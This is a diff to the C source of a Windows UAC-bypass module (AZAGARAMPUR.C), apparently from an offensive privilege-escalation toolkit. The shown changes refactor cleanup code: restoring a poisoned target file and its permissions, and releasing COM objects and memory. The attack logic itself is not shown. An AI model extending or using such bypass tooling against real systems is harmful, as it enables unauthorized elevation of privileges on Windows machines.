@@ -4,9 +4,9 @@
 *
 *  TITLE:       AZAGARAMPUR.C
 *
-*  VERSION:     3.67
+*  VERSION:     3.69
 *
-*  DATE:        11 Feb 2025
+*  DATE:        07 Jul 2025
 *
 *  UAC bypass methods from AzAgarampur.
 *
@@ -280,38 +280,37 @@ NTSTATUS ucmNICPoisonMethod(
     //
     // Restore original file contents and permissions.
     //
-    if (origFileBuffer && lpTargetFileName) {
+    if (origFileBuffer) {
+        if (lpTargetFileName) {
+            hFile = CreateFile(lpTargetFileName,
+                GENERIC_WRITE,
+                0,
+                NULL,
+                OPEN_EXISTING,
+                0,
+                NULL);
 
-        hFile = CreateFile(lpTargetFileName,
-            GENERIC_WRITE,
-            0,
-            NULL,
-            OPEN_EXISTING,
-            0,
-            NULL);
-
-        if (hFile != INVALID_HANDLE_VALUE) {
-            WriteFile(hFile, origFileBuffer, origSize, &bytesIO, NULL);
-            SetEndOfFile(hFile);
-            CloseHandle(hFile);
+            if (hFile != INVALID_HANDLE_VALUE) {
+                WriteFile(hFile, origFileBuffer, origSize, &bytesIO, NULL);
+                SetEndOfFile(hFile);
+                CloseHandle(hFile);
+            }
         }
 
         supVirtualFree(origFileBuffer, NULL);
+    }
 
-        if (oldSecurity) {
-
-            if (bSecurityReset) {
-
-                ucmMasqueradedSetObjectSecurityCOM(lpTargetFileName,
-                    DACL_SECURITY_INFORMATION,
-                    SE_FILE_OBJECT,
-                    oldSecurity);
-
-            }
-
-            CoTaskMemFree(oldSecurity);
+    if (oldSecurity) {
+        if (bSecurityReset && lpTargetFileName) {
+            ucmMasqueradedSetObjectSecurityCOM(lpTargetFileName,
+                DACL_SECURITY_INFORMATION,
+                SE_FILE_OBJECT,
+                oldSecurity);
         }
+        CoTaskMemFree(oldSecurity);
+    }
 
+    if (lpTargetFileName) {
         supHeapFree(lpTargetFileName);
     }
 
@@ -1876,10 +1875,17 @@ NTSTATUS ucmxGenerateAUX(
 
             asmName->lpVtbl->Finalize(asmName);
             asmName->lpVtbl->Release(asmName);
+            asmName = NULL;
         }
 
-        if (FAILED(hr) || bFound == FALSE)
+        if (FAILED(hr) || bFound == FALSE) {
+            if (asmName) {
+                asmName->lpVtbl->Finalize(asmName);
+                asmName->lpVtbl->Release(asmName);
+                asmName = NULL;
+            }
             break;
+        }
 
         lpDisplayNameANSI = (LPSTR)supHeapAlloc((1 + cchDisplayName) * sizeof(CHAR));
         if (lpDisplayNameANSI == NULL)
@@ -1985,12 +1991,8 @@ NTSTATUS ucmxGenerateAUX(
     if (asmEnum)
         asmEnum->lpVtbl->Release(asmEnum);
 
-    if (!NT_SUCCESS(ntStatus)) {
-
-        if (auxPtr)
-            supHeapFree(auxPtr);
-
-    }
+    if (!NT_SUCCESS(ntStatus) && auxPtr)
+        supHeapFree(auxPtr);
 
     return ntStatus;
 }
